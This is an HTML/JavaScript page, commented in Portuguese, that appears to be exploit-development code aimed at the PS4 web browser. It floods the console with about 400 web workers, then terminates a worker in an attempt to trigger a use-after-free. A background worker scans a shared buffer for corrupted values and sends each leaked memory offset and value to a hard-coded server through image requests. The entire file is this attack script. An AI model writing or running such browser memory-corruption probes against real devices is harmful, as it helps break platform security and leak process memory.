<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 THRESHOLD SCANNER (TARGET 400)</title>
    <style>
        body { background-color: #000; color: #ff0; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 2em; border: 2px solid #555; padding: 20px; margin: 20px 0; background: #220; }
        .danger { background-color: #500 !important; color: #fff !important; animation: shake 0.5s infinite; }
        @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
    </style>
</head>
<body>

    <h1>THRESHOLD SCANNER (AUTO-TRIGGER)</h1>
    <div id="status">INICIALIZANDO...</div>

    <script>
        // --- CONFIGURAÇÃO ---
        const SERVER_IP = "192.168.3.19"; // SEU IP
        const SERVER_PORT = "8000";
        
        // LIMITES
        const SCAN_START = 390; // Começa a aquecer aqui
        const DANGER_ZONE = 400; // Onde o crash costuma acontecer
        const MAX_THREADS = 425; // Alvo final (se sobreviver)
        
        const STRUCT_SIZE = 128; // 512 bytes
        const PATTERN = 0x41414141; // AAAA

        let workers = [];
        let scanning = false;
        
        // Buffer compartilhado para velocidade máxima entre threads
        const sharedBuffer = new SharedArrayBuffer(STRUCT_SIZE * 4);
        const sensorArray = new Uint32Array(sharedBuffer);
        
        // WORKER 1: REPÓRTER (Lê memória e envia)
        const reporterCode = `
            onmessage = function(e) {
                const ip = e.data.ip;
                const port = e.data.port;
                const buffer = new Uint32Array(e.data.buffer);
                const pattern = e.data.pattern;
                let active = false;

                // Aguarda comando de início
                setInterval(() => {
                    if (e.data.start && !active) active = true;
                }, 100);

                // Loop de Scan (Roda sempre, mas só envia quando ativado)
                setInterval(() => {
                    // Verifica se o buffer foi corrompido (Valor != AAAA e != 0)
                    for(let i=0; i<buffer.length; i++) {
                        let val = buffer[i];
                        if (val !== 0 && val !== pattern) {
                            // ACHOU! ENVIA TUDO!
                            // Usa Image para evitar bloqueio de thread principal
                            const hex = val.toString(16);
                            new Image().src = "http://" + ip + ":" + port + "/LEAK_OFF_" + (i*4) + "_VAL_" + hex;
                        }
                    }
                }, 1); // 1ms = Velocidade Extrema
            }
        `;
        const reporterBlob = new Blob([reporterCode], {type:'text/javascript'});
        const reporterUrl = URL.createObjectURL(reporterBlob);
        const reporter = new Worker(reporterUrl);

        // WORKER 2: CARGA (Apenas peso)
        const loadBlob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const loadUrl = URL.createObjectURL(loadBlob);

        // WORKER 3: KAMIKAZE (Gatilho)
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function init() {
            // Limpa sensor
            sensorArray.fill(PATTERN);
            
            // Inicia Repórter
            reporter.postMessage({
                ip: SERVER_IP,
                port: SERVER_PORT,
                buffer: sharedBuffer,
                pattern: PATTERN,
                start: false // Ainda não
            });

            // Teste de Rede
            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/TESTE_INICIADO`;
            
            document.getElementById('status').innerText = "SUBINDO PRESSÃO...";
            loop();
        }

        function loop() {
            // Cria threads gradualmente
            let i = setInterval(() => {
                
                // Adiciona worker
                if(workers.length < MAX_THREADS) {
                    workers.push(new Worker(loadUrl));
                }

                // Atualiza UI
                if(workers.length % 10 === 0) {
                    document.getElementById('status').innerText = `THREADS: ${workers.length}`;
                }

                // GATILHO 1: WARMUP (390)
                if(workers.length === SCAN_START && !scanning) {
                    scanning = true;
                    // Avisa o repórter para ficar atento, mas o payload ainda não foi enviado
                    // Isso abre as conexões TCP
                    new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/WARMUP_390`;
                }

                // GATILHO 2: DANGER ZONE (400)
                if(workers.length >= DANGER_ZONE) {
                    document.getElementById('status').innerText = `ZONA DE PERIGO (${workers.length}) - ESCANEANDO!`;
                    document.getElementById('status').className = "danger";
                    
                    // 1. Tenta liberar memória e ocupar com o sensor
                    triggerUAF();
                    
                    // 2. Continua subindo threads para causar o pânico
                    // O Reporter já está lendo o sharedBuffer loucamente em background
                }

                // Se passar muito, para
                if(workers.length >= MAX_THREADS) clearInterval(i);

            }, 40); // 40ms entre threads (mais rápido que antes)
        }

        function triggerUAF() {
            // Tenta criar buracos na memória
            const w = new Worker(killerUrl);
            w.terminate();

            // Tenta forçar o sensor (SharedBuffer) para o buraco
            try {
                // Truque: Criar uma view do buffer e acessar
                // Isso força o mapeamento na memória física
                let v = new Uint32Array(sharedBuffer);
                v[0] = PATTERN; 
            } catch(e) {}
        }

        setTimeout(init, 1000);

    </script>
</body>
</html>
